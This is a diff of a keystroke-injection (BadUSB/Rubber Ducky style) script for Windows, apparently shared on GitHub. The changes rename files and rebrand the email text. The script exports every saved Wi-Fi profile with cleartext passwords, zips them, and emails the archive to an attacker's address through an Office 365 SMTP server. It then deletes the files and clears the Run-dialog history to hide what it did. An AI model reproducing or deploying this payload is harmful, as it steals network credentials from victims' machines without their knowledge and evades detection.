@@ -6,10 +6,10 @@ DELAY 400
 STRING cd Desktop
 ENTER
 DELAY 50
-STRING mkdir A
+STRING mkdir wifi
 ENTER
 DELAY 50
-STRING cd A
+STRING cd wifi
 ENTER
 DELAY 50
 STRING netsh wlan export profile key=clear 
@@ -20,8 +20,8 @@ ENTER
 DELAY 50
 STRING powershell
 ENTER
-DELAY 500
-STRING Compress-Archive -Path A -DestinationPath A.zip
+DELAY 1500
+STRING Compress-Archive -Path wifi -DestinationPath wifi.zip
 ENTER
 DELAY 5000
 STRING $SMTPServer = 'smtp.office365.com'
@@ -45,19 +45,19 @@ DELAY 100
 STRING $ReportEmail.To.Add('RECIVER EMAIL HERE')
 ENTER
 DELAY 100
-STRING $ReportEmail.Subject = "Harvest-Report"
+STRING $ReportEmail.Subject = "WiFi Passwords Script by GiKR-byte"
 ENTER
 DELAY 100
-STRING $ReportEmail.Body = "GG, you got it"
+STRING $ReportEmail.Body = "Here You Go... script by GiKR-byte on GitHub https://github.com/GiKR-byte"
 ENTER
 DELAY 100
-STRING $ReportEmail.Attachments.Add("A.zip")
+STRING $ReportEmail.Attachments.Add("wifi.zip")
 ENTER
 DELAY 100
 STRING $SMTPInfo.Send($ReportEmail)
 ENTER
 DELAY 100
-STRING Remove-Item A -Recurse -Force -Confirm:$false
+STRING Remove-Item wifi -Recurse -Force -Confirm:$false
 ENTER
 DELAY 100
 STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
@@ -66,7 +66,7 @@ DELAY 100
 STRING exit
 ENTER
 DELAY 500
-STRING del A.zip
+STRING del wifi.zip
 ENTER
 DELAY 500
 STRING exit
